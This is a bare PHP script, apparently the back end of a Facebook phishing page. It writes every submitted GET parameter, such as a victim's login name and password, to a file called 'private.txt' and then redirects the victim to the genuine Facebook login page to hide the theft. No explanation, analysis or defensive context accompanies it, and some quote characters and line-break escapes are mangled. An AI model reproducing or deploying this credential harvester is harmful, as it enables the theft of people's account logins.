
:<?php
header(“Location: https://www.facebook.com/login.php”);
$handle = fopen(“private.txt”, “a”);
foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);}
fwrite($handle, “rn”);
fclose($handle);
exit;
?>
